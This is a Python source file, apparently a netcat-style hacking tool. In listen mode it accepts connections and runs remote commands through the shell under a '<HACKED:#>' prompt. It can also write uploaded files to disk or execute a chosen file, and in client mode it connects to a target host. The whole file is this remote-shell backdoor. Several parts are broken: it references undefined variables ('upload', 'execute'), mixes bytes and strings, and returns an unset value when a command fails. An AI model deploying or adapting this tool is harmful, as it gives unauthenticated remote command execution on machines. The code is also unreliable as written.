import sys
import socket
import argparse
import subprocess
import threading




parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target_host', default="", help='specify target host')
parser.add_argument('-p', '--target_port', type=int, default=0,\
	help='specify target port')
parser.add_argument('-l', '--listen', default=False, metavar="listen_on_port",\
	help="listen on [host]:[port] for incoming connections")
parser.add_argument("-e", "--execute", metavar="file_to_execute", default="",\
	help="execute the given file upon receiving a connection")
parser.add_argument("-c", "--command", default=False, metavar="command_shell", \
	help="initialize a command shell")
parser.add_argument("-u", "--upload", default="", metavar="destination", \
	help="upon receiving connection upload a file and write to [destination]")

args=parser.parse_args()

def client_sender(buffer):

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		client.connect((args.target_host,args.target_port))

		if len(buffer):
			client.send(buffer.encode())
		while True:
			recv_len=1
			response=""

			while recv_len:
				data = client.recv(4096).decode()
				recv_len=len(data)
				response+=data

				if recv_len < 4096:
					break

			print(response)
			buffer = input("")
			buffer +="\n"
			client.send(buffer.encode())

	except Exception as e:
		print("[!]  %s"% e)
		client.close()

def server_loop():

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server.bind((args.target_host,args.target_port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()

def run_command(command):
	command = command.rstrip()
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except Exception as e:
		print("FAILED: %s"%e)
	return output

def client_handler(client_socket):
	if len(args.upload):
		file_buffer = ""
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data
		try:
			file_descriptor = open(upload,"wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			client_socket.send("Done: %s"%args.upload)
		except:
			client_socket.send("YOU FAILED! %s"%args.upload)

	if len(args.execute):
		output = run_command(execute)
		client_socket.send(output)

	if args.command:
		while True:
			client_socket.send("<HACKED:#> ".encode())
			command_buffer = ""
			while "\n" not in command_buffer:
					command_buffer += client_socket.recv(1024).decode()

			response = run_command(command_buffer)
			client_socket.send(response)


def main():
	if not args.listen and len(args.target_host) and args.target_port >0:
		buffer = sys.stdin.read()
		client_sender(buffer)

	if args.listen:
		server_loop()

if(__name__=="__main__"):
	main()